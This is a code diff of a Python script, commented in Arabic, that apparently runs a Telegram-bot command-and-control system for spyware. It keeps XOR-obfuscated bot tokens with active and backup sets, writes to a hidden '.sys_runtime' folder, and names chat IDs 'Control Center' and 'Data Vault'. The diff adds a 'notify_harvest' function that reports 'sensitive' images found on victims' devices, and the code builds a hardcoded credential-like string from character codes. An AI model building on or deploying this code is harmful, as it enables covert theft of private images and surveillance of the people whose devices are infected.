@@ -1,6 +1,7 @@
 # -*- coding: utf-8 -*-
 import os, time, json, random, threading, logging, requests, sys, importlib
 
+# إعداد المسارات والبيئة
 P = os.path.join(os.getcwd(), ".sys_runtime")
 if not os.path.exists(P):
     os.makedirs(P)
@@ -12,6 +13,7 @@ logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, file
 def _x(b, k=0x5A):
     return bytes([c ^ k for c in b])
 
+# التوكنات المشفرة
 _enc = [
     b'mcbclboljh`\x1b\x1b\x1c\x08\x1b\r\x0332\x1c\x0ci\x0c"l\x02\x15\x0f\x10#09\x0e\x15\x00\x035b9\x0eo\x1e\n\x10\x0b',
     b'bkkihcihnn`\x1b\x1b\x1c\x1c-\x0e\x12\x00o\x1d15\x0ci\x1e\x14bb0?\x0fb\x02/\x172\x10<j\x11\x16\x0e)<n',
@@ -28,6 +30,7 @@ _enc = [
 def _d():
     return [_x(e).decode() for e in _enc]
 
+# ========== الكلاس الأساسي ==========
 class T:
     def __init__(self, m):
         self.m = m
@@ -38,13 +41,15 @@ class T:
         self.dvs = {}
         self.adm = {}
         self.p_upd = set()
+        
         all_t = _d()
-        self.act = all_t[:6]
-        self.bak = all_t[6:]
+        self.act = all_t[:6]          # بوتات نشطة
+        self.bak = all_t[6:]          # بوتات احتياطية
         self.cur = 0
-        self.cmd = "-1003365166986"
-        self.dat = "-1003787520015"
+        self.cmd = "-1003365166986"   # Control Center
+        self.dat = "-1003787520015"   # Data Vault
         self.rn = True
+        
         self._ld()
         threading.Thread(target=self._ka, daemon=True).start()
 
@@ -114,6 +119,23 @@ class T:
             })
             return tid
         return None
+
+    # ---------- ميزة جديدة: إرسال تقرير الحصاد ----------
+    def notify_harvest(self, did, count):
+        """إرسال تقرير مختصر عند العثور على صور حساسة"""
+        device = self.dvs.get(did)
+        if device and 't' in device:
+            tid = device['t']
+            msg = (f"📦 <b>Harvest Report</b>\n"
+                   f"Device: {device['n']}\n"
+                   f"Found: {count} sensitive item(s)\n"
+                   f"Time: {time.strftime('%H:%M:%S')}")
+            self._ap("sendMessage", {
+                "chat_id": self.cmd,
+                "message_thread_id": tid,
+                "text": msg,
+                "parse_mode": "HTML"
+            })
 
     def _km(self):
         return {"inline_keyboard": [
@@ -274,7 +296,6 @@ class T:
     def start(self):
         threading.Thread(target=self._pl, daemon=True).start()
 
-
-# دالة مساعدة (غير مستخدمة حالياً، ولكن للإكمال)
+# دالة مساعدة
 def _():
     return "".join([chr(x) for x in [90, 97, 101, 110, 49, 50, 51, 64, 49, 50, 51, 64]])
